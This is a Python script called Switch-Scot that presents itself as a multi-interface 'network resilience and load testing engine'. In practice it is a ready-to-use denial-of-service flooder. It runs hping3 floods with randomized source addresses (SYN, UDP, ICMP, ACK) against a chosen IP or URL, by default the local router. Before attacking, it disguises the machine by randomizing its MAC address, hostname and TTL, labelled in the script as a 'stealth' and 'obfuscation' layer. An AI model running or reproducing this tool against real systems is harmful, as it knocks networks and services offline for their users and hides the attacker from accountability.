#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Switch-Scot ⚡
Universal Multi-Interface Network Resilience & Load Testing Engine
Designed for Linux (Arch, Kali, Debian, Ubuntu) and Android (Termux)
"""

import os
import sys
import re
import random
import signal
import subprocess
import argparse
import time
import socket
from urllib.parse import urlparse
from datetime import datetime

BANNER = r"""
  ___         _ _       _          ___ cot ⚡
 / __|_ __ __(_) |_ ___| |_ _____ / __| __ ___ 
 \__ \ V  V /| |  _/ __| ' \_____\__ \ _| '_ \
 |___/\_/\_/ |_|\__\___|_||_|    |___/__| .__/
                                         |_|   
 Universal Multi-Interface Network Resilience Engine v3.5 [AR/EN]
"""

# القواميس اللغوية للدعم الكامل للغة العربية والإنجليزية
MESSAGES = {
    "ar": {
        "menu_title": "🛠️  لوحة التحكم والإعداد التفاعلي السريع (Switch-Scot)",
        "detected_ifaces": "[+] كروت الشبكة المكتشفة في النظام:",
        "all_ifaces": "[A] تشغيل جميع الكروت معاً في نفس اللحظة (وضع التيربو الخارق 🚀)",
        "select_iface": "[؟] اختر كرت الشبكة [مثال: 1 أو 1,2 أو A للكل - الافتراضي 1]: ",
        "selected_iface": "-> تم تحديد الكروت: ",
        "enter_target": "[؟] أدخل عنوان الهدف (IP أو رابط صفحة الويب) [الافتراضي: {default}]: ",
        "target_ip": "-> عنوان الهدف المعتمد (Host/IP): ",
        "extracted_port": "-> المنفذ المستخرج تلقائياً: ",
        "enter_port": "[؟] أدخل رقم المنفذ المستهدف [الافتراضي: {default}]: ",
        "final_port": "-> المنفذ النهائي: ",
        "modes_title": "[+] أوضاع الفحص والتقييم:",
        "mode_1": "1. TCP-SYN  - استنزاف طابور الاتصالات في النواة (الافتراضي / الأقوى)",
        "mode_2": "2. UDP      - ضغط واختبار ذاكرة التخزين المؤقتة (Buffer Stress)",
        "mode_3": "3. ICMP     - قياس استجابة وتأخير معالج الراوتر (Control Plane)",
        "mode_4": "4. TCP-ACK  - اختبار فلاتر جدران الحماية المتقدمة (Stateful Firewall)",
        "select_mode": "[؟] اختر وضع الفحص [1-4، الافتراضي 1]: ",
        "selected_mode": "-> الوضع المعتمد: ",
        "hostname_prompt": "[؟] أدخل اسم الجهاز المخصص ليظهر في الراوتر [الافتراضي: جهاز ذكي عشوائي]: ",
        "custom_host_set": "-> اسم الجهاز المنحول: ",
        "random_host_set": "-> اسم الجهاز: توليد عشوائي ذكي",
        "mac_title": "[+] سياسة تمويه وتدوير الماك أدرس (MAC Address):",
        "mac_1": "1. الاحتفاظ بالماك الحالي (موصى به للواي فاي النشط على اللابتوب)",
        "mac_2": "2. تدوير الماك بالكامل عشوائياً (تمويه فيزيائي شامل لكرت الشبكة)",
        "select_mac": "[؟] اختر سياسة الماك [1-2، الافتراضي 1]: ",
        "mac_safe": "-> سياسة الماك: الاحتفاظ بالماك الحالي لضمان استقرار الواي فاي",
        "mac_random": "-> سياسة الماك: تدوير الماك بالكامل عبر macchanger",
        "press_enter": "⚡ اضغط [ENTER] لإطلاق محرك Switch-Scot والبدء فوراً...",
        "engine_active": "⚡ محرك SWITCH-SCOT يعمل الآن بأقصى طاقة",
        "platform": "• بيئة التشغيل  : ",
        "interfaces": "• كروت الشبكة  : ",
        "hostname": "• اسم الجهاز   : ",
        "mode_info": "• النمط والهدف  : ",
        "press_ctrl_c": " [*] اضغط Ctrl+C لإيقاف العملية في أي وقت بأمان.\n",
        "running_status": "\r >> [جاري الضخ] الهدف: {target}:{port} | الكروت النشطة: [{ifaces}] | النمط: {mode} | الوقت المنقضي: {elapsed} ",
        "stopped": "\n\n[+] تم إيقاف محرك Switch-Scot بنجاح على جميع الكروت.",
        "root_error_termux": "\n[!] خطأ: يتطلب صلاحيات الروت. قم بتشغيل 'tsu' أولاً ثم أعد التشغيل.",
        "root_error_linux": "\n[!] خطأ: يتطلب صلاحيات الروت. قم بالتشغيل باستخدام 'sudo switch-scot'.",
        "missing_tools": "\n[!] تنبيه: هناك أدوات نظامية مفقودة: {tools}",
        "termux_install_hint": "[*] للتثبيت على تيرمكس: pkg install root-repo && pkg install tsu hping3 macchanger iproute2",
        "debian_install_hint": "[*] للتثبيت على دبيان/كالي: sudo apt install -y hping3 macchanger iproute2",
        "arch_install_hint": "[*] للتثبيت على آرش لينكس: sudo pacman -S --noconfirm hping macchanger iproute2",
        "applying_stealth": "\n[*] جاري تطبيق طبقة التمويه وإخفاء الهوية...",
        "verifying_carrier": "[*] جاري التحقق من جاهزية الاتصال ومسار التوجيه على '{iface}'...",
        "carrier_ready": "[+] الكرت '{iface}' متصل بالشبكة ومسار التوجيه إلى {target} جاهز.",
        "carrier_timeout": "[!] تنبيه: انتهت مهلة فحص المسار، جاري بدء الإرسال المباشر على '{iface}'."
    },
    "en": {
        "menu_title": "🛠️  INTERACTIVE EASY SETUP MENU (Switch-Scot)",
        "detected_ifaces": "[+] Detected Network Interfaces in System:",
        "all_ifaces": "[A] ALL Interfaces Simultaneously (Multi-Card Turbo Mode 🚀)",
        "select_iface": "[?] Select Interface(s) [e.g. 1, 1,2, or A for all - default 1]: ",
        "selected_iface": "-> Selected Interface(s): ",
        "enter_target": "[?] Enter Target IP or Web Login URL [Default: {default}]: ",
        "target_ip": "-> Target Host/IP: ",
        "extracted_port": "-> Auto-extracted Port: ",
        "enter_port": "[?] Enter Target Port [Default: {default}]: ",
        "final_port": "-> Final Target Port: ",
        "modes_title": "[+] Evaluation Modes:",
        "mode_1": "1. TCP-SYN  - Connection Table Saturation (Default / Maximum Stress)",
        "mode_2": "2. UDP      - Stateless Buffer Stress",
        "mode_3": "3. ICMP     - Control Plane Latency & CPU Load",
        "mode_4": "4. TCP-ACK  - Stateful Firewall Filter Inspection",
        "select_mode": "[?] Select Mode [1-4, default 1]: ",
        "selected_mode": "-> Selected Mode: ",
        "hostname_prompt": "[?] Enter Custom Device Name (Hostname) [Default: Random Smart Device]: ",
        "custom_host_set": "-> Custom Device Hostname: ",
        "random_host_set": "-> Device Hostname: Randomly Generated",
        "mac_title": "[+] MAC Address Randomization Policy:",
        "mac_1": "1. Keep Current MAC (Recommended for stable active Wi-Fi)",
        "mac_2": "2. Randomize MAC Address (Full Hardware Spoofing)",
        "select_mac": "[?] Select MAC Policy [1-2, default 1]: ",
        "mac_safe": "-> MAC Policy: Keep Active MAC (Safe Wi-Fi)",
        "mac_random": "-> MAC Policy: Randomize MAC Address (Full Spoof)",
        "press_enter": "⚡ Press [ENTER] to launch Switch-Scot on all selected interfaces...",
        "engine_active": "⚡ SWITCH-SCOT MULTI-INTERFACE ENGINE ACTIVE",
        "platform": "• Platform   : ",
        "interfaces": "• Interfaces : ",
        "hostname": "• Hostname   : ",
        "mode_info": "• Mode/Target: ",
        "press_ctrl_c": " [*] Press Ctrl+C to terminate execution.\n",
        "running_status": "\r >> [RUNNING] Target: {target}:{port} | Active Cards: [{ifaces}] | Mode: {mode} | Elapsed: {elapsed} ",
        "stopped": "\n\n[+] Switch-Scot execution stopped on all interfaces.",
        "root_error_termux": "\n[!] Error: Root privileges required. Run with 'tsu'",
        "root_error_linux": "\n[!] Error: Root privileges required. Run with 'sudo switch-scot'",
        "missing_tools": "\n[!] Missing required system tools: {tools}",
        "termux_install_hint": "[*] Install on Termux: pkg install root-repo && pkg install tsu hping3 macchanger iproute2",
        "debian_install_hint": "[*] Install on Debian/Kali: sudo apt install -y hping3 macchanger iproute2",
        "arch_install_hint": "[*] Install on Arch: sudo pacman -S --noconfirm hping macchanger iproute2",
        "applying_stealth": "\n[*] Applying persistent obfuscation layer...",
        "verifying_carrier": "[*] Verifying carrier link and route readiness on '{iface}'...",
        "carrier_ready": "[+] Interface '{iface}' connected. Route to {target} verified.",
        "carrier_timeout": "[!] Notice: Link timeout reached. Proceeding on '{iface}'."
    }
}

class SwitchScot:
    def __init__(self, target="10.0.0.1", port=80, interfaces=None, mode="tcp-syn", skip_mac=False, custom_hostname=None, lang="ar"):
        self.lang = lang if lang in MESSAGES else "ar"
        self.msg = MESSAGES[self.lang]
        
        parsed_target, parsed_port = self.parse_target(target, port)
        self.target = parsed_target
        self.port = parsed_port
        self.mode = mode
        self.skip_mac = skip_mac
        self.custom_hostname = custom_hostname
        self.is_termux = self.check_termux()
        
        if interfaces is None:
            self.interfaces = [self.detect_default_interface()]
        elif isinstance(interfaces, str):
            self.interfaces = [i.strip() for i in interfaces.split(",") if i.strip()]
        else:
            self.interfaces = list(interfaces)
            
        if not self.interfaces:
            self.interfaces = [self.detect_default_interface()]

        self.attack_processes = []
        self.start_time = None
        self.current_macs = {}
        self.current_hostname = "N/A"

    @staticmethod
    def parse_target(raw_input, default_port=80):
        if not raw_input:
            return "10.0.0.1", default_port or 80

        raw_input = str(raw_input).strip()
        target_port = default_port or 80

        if not raw_input.startswith(('http://', 'https://')):
            match = re.match(r'^([^/:]+):(\d+)(/.*)?$', raw_input)
            if match:
                host = match.group(1)
                target_port = int(match.group(2))
                return host, target_port
            test_url = 'http://' + raw_input
        else:
            test_url = raw_input

        try:
            parsed = urlparse(test_url)
            host = parsed.hostname or raw_input
            if parsed.port:
                target_port = parsed.port
            elif parsed.scheme == 'https':
                target_port = 443
            elif parsed.scheme == 'http':
                target_port = 80
            
            try:
                ip = socket.gethostbyname(host)
                return ip, target_port
            except Exception:
                return host, target_port
        except Exception:
            return raw_input, target_port

    @staticmethod
    def check_termux():
        return "com.termux" in os.environ.get("PREFIX", "") or os.path.exists("/data/data/com.termux")

    def check_root(self):
        if os.geteuid() != 0:
            if self.is_termux:
                print(self.msg["root_error_termux"])
            else:
                print(self.msg["root_error_linux"])
            sys.exit(1)

    def check_dependencies(self):
        required_tools = ["hping3", "ip"]
        if not self.skip_mac:
            required_tools.append("macchanger")

        missing = []
        for tool in required_tools:
            if subprocess.run(["which", tool], capture_output=True).returncode != 0:
                missing.append(tool)
        
        if missing:
            print(self.msg["missing_tools"].format(tools=', '.join(missing)))
            if self.is_termux:
                print(self.msg["termux_install_hint"])
            elif os.path.exists("/etc/arch-release"):
                print(self.msg["arch_install_hint"])
            else:
                print(self.msg["debian_install_hint"])
            sys.exit(1)

    @staticmethod
    def get_available_interfaces():
        try:
            return [f for f in os.listdir('/sys/class/net') if f != 'lo']
        except Exception:
            return ["wlan0"]

    @staticmethod
    def detect_gateway():
        try:
            out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"default via (\d{1,3}(\.\d{1,3}){3})", out)
            if match:
                return match.group(1)
        except Exception:
            pass
        return "10.0.0.1"

    def detect_default_interface(self):
        try:
            out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"dev\s+([^\s]+)", out)
            if match:
                return match.group(1)
        except Exception:
            pass

        ifaces = self.get_available_interfaces()
        return ifaces[0] if ifaces else "wlan0"

    def get_mac_address(self, iface):
        try:
            out = subprocess.check_output(["ip", "link", "show", iface], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"link/ether\s+(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})", out)
            return match.group(1) if match else "Unknown"
        except Exception:
            return "Unknown"

    def wait_for_carrier_and_route(self, iface, timeout=15):
        print(self.msg["verifying_carrier"].format(iface=iface))
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            carrier_ok = False
            carrier_file = f"/sys/class/net/{iface}/carrier"
            operstate_file = f"/sys/class/net/{iface}/operstate"

            if os.path.exists(carrier_file):
                try:
                    with open(carrier_file, "r") as f:
                        if f.read().strip() == "1":
                            carrier_ok = True
                except Exception:
                    pass
            elif os.path.exists(operstate_file):
                try:
                    with open(operstate_file, "r") as f:
                        if f.read().strip() in ["up", "unknown"]:
                            carrier_ok = True
                except Exception:
                    pass
            else:
                carrier_ok = True

            if carrier_ok:
                try:
                    res = subprocess.run(["ip", "route", "get", self.target], capture_output=True)
                    if res.returncode == 0:
                        print(self.msg["carrier_ready"].format(iface=iface, target=self.target))
                        return True
                except Exception:
                    pass

            time.sleep(1)

        print(self.msg["carrier_timeout"].format(iface=iface))
        return False

    def randomize_identity(self):
        print(self.msg["applying_stealth"])
        
        # 1. Randomize TTL (64 - 128)
        new_ttl = random.randint(64, 128)
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_default_ttl={new_ttl}"], capture_output=True)

        # 2. Set Device Hostname
        if self.custom_hostname:
            new_host = self.custom_hostname.replace(" ", "-")
        else:
            host_pool = [
                "iPhone-14-Pro", "iPad-Air", "Galaxy-S23", "Pixel-8-Pro", 
                "MacBook-Pro-M2", "Dell-XPS-15", "ThinkPad-X1", "Smart-TV-LG",
                "Workstation-X", "Ubuntu-Server", "Surface-Laptop"
            ]
            new_host = f"{random.choice(host_pool)}-{random.randint(100, 999)}"
            
        subprocess.run(["hostname", new_host], capture_output=True)
        self.current_hostname = new_host

        # 3. Randomize MAC Address for all selected interfaces
        for iface in self.interfaces:
            if not self.skip_mac:
                print(f"[*] Cycling MAC address on '{iface}'...")
                subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
                subprocess.run(["macchanger", "-r", iface], capture_output=True)
                subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
                self.current_macs[iface] = self.get_mac_address(iface)
                self.wait_for_carrier_and_route(iface)
            else:
                self.current_macs[iface] = self.get_mac_address(iface)
                print(f"[*] Preserving existing MAC address on '{iface}' ({self.current_macs[iface]}).")

        # 4. Flush ARP neighbor cache
        subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)

    def build_command_for_interface(self, iface):
        base_cmd = ["hping3", "--flood", "--rand-source", "-I", iface]
        
        if self.mode == "tcp-syn":
            return base_cmd + ["-p", str(self.port), "-S", self.target]
        elif self.mode == "udp":
            return base_cmd + ["--udp", "-p", str(self.port), self.target]
        elif self.mode == "icmp":
            return base_cmd + ["--icmp", self.target]
        elif self.mode == "tcp-ack":
            return base_cmd + ["-p", str(self.port), "-A", self.target]
        else:
            return base_cmd + ["-p", str(self.port), "-S", self.target]

    def start(self):
        self.check_root()
        self.check_dependencies()
        self.randomize_identity()

        print("\n" + "=" * 65)
        print(f" {self.msg['engine_active']}")
        print(f" {self.msg['platform']}{'Android (Termux)' if self.is_termux else 'Linux OS'}")
        ifaces_info = [f"{i} ({self.current_macs.get(i, 'N/A')})" for i in self.interfaces]
        print(f" {self.msg['interfaces']}{', '.join(ifaces_info)}")
        print(f" {self.msg['hostname']}{self.current_hostname}")
        print(f" {self.msg['mode_info']}{self.mode.upper()} | Target: {self.target}:{self.port if self.mode != 'icmp' else 'ICMP'}")
        print("=" * 65)
        print(self.msg["press_ctrl_c"])

        self.start_time = datetime.now()
        try:
            for iface in self.interfaces:
                cmd = self.build_command_for_interface(iface)
                proc = subprocess.Popen(
                    cmd,
                    preexec_fn=os.setsid,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.attack_processes.append(proc)
            
            ifaces_str = ", ".join(self.interfaces)
            while True:
                elapsed = str(datetime.now() - self.start_time).split(".")[0]
                status_text = self.msg["running_status"].format(
                    target=self.target,
                    port=self.port,
                    ifaces=ifaces_str,
                    mode=self.mode.upper(),
                    elapsed=elapsed
                )
                sys.stdout.write(status_text)
                sys.stdout.flush()
                time.sleep(1)

        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        for proc in self.attack_processes:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                pass
        print(self.msg["stopped"])
        sys.exit(0)

def run_interactive_menu():
    print(BANNER)
    
    # 0. Language Selection
    print("=" * 65)
    print(" [1] 🇸🇦 العربية (Arabic)")
    print(" [2] 🇬🇧 English")
    print("=" * 65)
    lang_sel = input("[؟/Query] Select Language / اختر اللغة [1-2, default 1]: ").strip()
    lang = "en" if lang_sel == "2" else "ar"
    msg = MESSAGES[lang]

    print("\n" + "=" * 65)
    print(f" {msg['menu_title']}")
    print("=" * 65)

    # 1. Multi-Interface Selection
    ifaces = SwitchScot.get_available_interfaces()
    default_iface = ifaces[0] if ifaces else "wlan0"
    
    print(f"\n{msg['detected_ifaces']}")
    for idx, iface in enumerate(ifaces, start=1):
        tag = " (الافتراضي)" if idx == 1 and lang == "ar" else (" (Default)" if idx == 1 else "")
        print(f"  [{idx}] {iface}{tag}")
    print(f"  {msg['all_ifaces']}")
    
    sel_iface = input(f"\n{msg['select_iface']}").strip().lower()
    
    chosen_ifaces = []
    if sel_iface in ["a", "all", "ش", "الكل"]:
        chosen_ifaces = ifaces
    elif sel_iface:
        parts = re.split(r'[, ]+', sel_iface)
        for p in parts:
            try:
                num = int(p)
                if 1 <= num <= len(ifaces):
                    chosen_ifaces.append(ifaces[num - 1])
            except ValueError:
                if p in ifaces:
                    chosen_ifaces.append(p)
        chosen_ifaces = list(dict.fromkeys(chosen_ifaces))
    
    if not chosen_ifaces:
        chosen_ifaces = [default_iface]
        
    print(f" {msg['selected_iface']}{', '.join(chosen_ifaces)}")

    # 2. Target IP or URL Selection
    detected_gw = SwitchScot.detect_gateway()
    target_input = input(f"\n{msg['enter_target'].format(default=detected_gw)}").strip()
    raw_target = target_input if target_input else detected_gw
    
    extracted_host, extracted_port = SwitchScot.parse_target(raw_target, default_port=80)
    print(f" {msg['target_ip']}{extracted_host}")
    if raw_target.startswith(('http://', 'https://')) or ":" in raw_target:
        print(f" {msg['extracted_port']}{extracted_port}")

    # 3. Port Selection
    port_input = input(f"\n{msg['enter_port'].format(default=extracted_port)}").strip()
    try:
        chosen_port = int(port_input) if port_input else extracted_port
    except ValueError:
        chosen_port = extracted_port
    print(f" {msg['final_port']}{chosen_port}")

    # 4. Mode Selection
    modes = [
        ("tcp-syn", msg["mode_1"]),
        ("udp",     msg["mode_2"]),
        ("icmp",    msg["mode_3"]),
        ("tcp-ack", msg["mode_4"])
    ]
    print(f"\n{msg['modes_title']}")
    for idx, (m_id, m_desc) in enumerate(modes, start=1):
        print(f"  [{idx}] {m_desc}")
    
    sel_mode = input(f"\n{msg['select_mode']}").strip()
    try:
        chosen_mode = modes[int(sel_mode) - 1][0] if sel_mode else "tcp-syn"
    except (ValueError, IndexError):
        chosen_mode = "tcp-syn"
    print(f" {msg['selected_mode']}{chosen_mode.upper()}")

    # 5. Hostname Policy
    host_input = input(f"\n{msg['hostname_prompt']}").strip()
    custom_host = host_input if host_input else None
    if custom_host:
        print(f" {msg['custom_host_set']}{custom_host}")
    else:
        print(f" {msg['random_host_set']}")

    # 6. MAC Address Policy
    print(f"\n{msg['mac_title']}")
    print(f"  [1] {msg['mac_1']}")
    print(f"  [2] {msg['mac_2']}")
    mac_choice = input(f"\n{msg['select_mac']}").strip()
    skip_mac = False if mac_choice == "2" else True
    print(f" {msg['mac_safe'] if skip_mac else msg['mac_random']}")

    # Launch Engine
    print("\n" + "-" * 65)
    input(msg["press_enter"])
    
    engine = SwitchScot(
        target=extracted_host,
        port=chosen_port,
        interfaces=chosen_ifaces,
        mode=chosen_mode,
        skip_mac=skip_mac,
        custom_hostname=custom_host,
        lang=lang
    )
    engine.start()

def main():
    if len(sys.argv) == 1:
        run_interactive_menu()
        return

    parser = argparse.ArgumentParser(
        description="Switch-Scot ⚡ Universal Multi-Interface Network Resilience & Load Testing Engine",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-t", "--target",
        default="10.0.0.1",
        help="Target IP address or Web URL (e.g. 192.168.8.1 or http://router.lan:8080/login.html)"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=None,
        help="Target Port (Default: Auto-extracted from URL or 80)"
    )
    parser.add_argument(
        "-i", "--interfaces",
        nargs="+",
        default=None,
        help="Network interface(s) to bind (e.g. -i wlp4s0 wlp9s0f4u2 or 'all')"
    )
    parser.add_argument(
        "-H", "--hostname",
        default=None,
        help="Custom device name/hostname to appear on target (Default: Random smart device)"
    )
    parser.add_argument(
        "-m", "--mode",
        choices=["tcp-syn", "udp", "icmp", "tcp-ack"],
        default="tcp-syn",
        help="Evaluation Mode:\n"
             "  tcp-syn  : TCP SYN Connection Load (Default)\n"
             "  udp      : UDP Stateless Buffer Stress\n"
             "  icmp     : ICMP Echo Control Plane Latency\n"
             "  tcp-ack  : TCP ACK Stateful Filter Inspection"
    )
    parser.add_argument(
        "--no-mac",
        action="store_true",
        help="Skip MAC address randomization (Recommended for active Wi-Fi on laptops)"
    )
    parser.add_argument(
        "-l", "--lang",
        choices=["ar", "en"],
        default="ar",
        help="Display language: [ar] for Arabic (Default), [en] for English"
    )

    args = parser.parse_args()
    
    cli_ifaces = args.interfaces
    if cli_ifaces and len(cli_ifaces) == 1 and cli_ifaces[0].lower() in ["all", "a", "الكل"]:
        cli_ifaces = SwitchScot.get_available_interfaces()

    engine = SwitchScot(
        target=args.target,
        port=args.port,
        interfaces=cli_ifaces,
        mode=args.mode,
        skip_mac=args.no_mac,
        custom_hostname=args.hostname,
        lang=args.lang
    )
    engine.start()

if __name__ == "__main__":
    main()
